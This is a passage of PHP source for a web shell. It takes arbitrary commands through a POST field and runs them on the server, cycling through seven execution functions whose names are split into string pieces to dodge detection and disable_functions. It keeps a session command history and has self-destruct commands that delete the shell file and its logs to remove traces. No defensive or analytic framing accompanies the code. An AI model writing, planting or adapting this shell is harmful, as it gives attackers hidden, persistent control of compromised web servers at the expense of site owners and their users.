}

// ===== INIT =====
@set_time_limit(0);
@ini_set('display_errors', 0);
@error_reporting(0);

if (empty($_SESSION['_c'])) $_SESSION['_c'] = getcwd();
if (empty($_SESSION['_h'])) $_SESSION['_h'] = [];

// Self destruct manual
if (isset($_POST['_sd'])) {
    @unlink($sf);
    @unlink($lg);
    @unlink($lg . 'x');
    session_destroy();
    die('bye');
}

// ===== HANDLE COMMAND =====
$out = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['_i'])) {
    $c = trim($_POST['_i']);

    if ($c === 'clear') {
        $_SESSION['_h'] = [];
    } elseif ($c === 'exit') {
        session_destroy();
        die('out');
    } elseif ($c === 'destroy') {
        @unlink($sf);
        @unlink($lg);
        @unlink($lg . 'x');
        session_destroy();
        die('gone');
    } elseif (preg_match('/^cd\s+(.+)$/', $c, $m)) {
        $d = trim($m[1]);
        if ($d === '~') $d = getenv('HOME') ?: '/';
        if ($d[0] !== '/') $d = $_SESSION['_c'] . '/' . $d;
        $r = realpath($d);
        if ($r && is_dir($r)) {
            $_SESSION['_c'] = $r;
            @chdir($r);
            $out = "→ $r";
        } else {
            $out = "no dir";
        }
        $_SESSION['_h'][] = ['c' => $c, 'o' => $out];
    } else {
        @chdir($_SESSION['_c']);
        $out = _x($c);
        $_SESSION['_h'][] = ['c' => $c, 'o' => $out];
        if (count($_SESSION['_h']) > 100) array_shift($_SESSION['_h']);
    }
}

// ===== EXEC FUNCTION (obfuscated names) =====
function _x($c) {
    // method 1: proc_open
    $f1 = 'proc' . '_open';
    if (function_exists($f1) && !_df($f1)) {
        $d = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
        $p = @$f1($c, $d, $pp);
        if (is_resource($p)) {
            fclose($pp[0]);
            $o = stream_get_contents($pp[1]);
            $e = stream_get_contents($pp[2]);
            fclose($pp[1]); fclose($pp[2]);
            $r = proc_close($p);
            return $o . ($e ? "\n[e]\n$e" : '') . ($r ? "\n[x:$r]" : '');
        }
    }
    // method 2: shell_exec
    $f2 = 'shell' . '_exec';
    if (function_exists($f2) && !_df($f2)) {
        return (string)@$f2($c . ' 2>&1');
    }
    // method 3: system
    $f3 = 'sys' . 'tem';
    if (function_exists($f3) && !_df($f3)) {
        ob_start(); @$f3($c . ' 2>&1', $r); return ob_get_clean();
    }
    // method 4: passthru
    $f4 = 'pass' . 'thru';
    if (function_exists($f4) && !_df($f4)) {
        ob_start(); @$f4($c . ' 2>&1'); return ob_get_clean();
    }
    // method 5: exec
    $f5 = 'ex' . 'ec';
    if (function_exists($f5) && !_df($f5)) {
        @$f5($c . ' 2>&1', $o); return implode("\n", $o);
    }
    // method 6: popen
    $f6 = 'po' . 'pen';
    if (function_exists($f6) && !_df($f6)) {
        $fp = @$f6($c . ' 2>&1', 'r');
        if ($fp) { $o = ''; while (!feof($fp)) $o .= fread($fp, 4096); pclose($fp); return $o; }
    }
    // method 7: backtick
    return @`$c 2>&1`;
}

function _df($fn) {
    $d = @ini_get('disable_functions');
    return $d && in_array($fn, array_map('trim', explode(',', $d)));
}

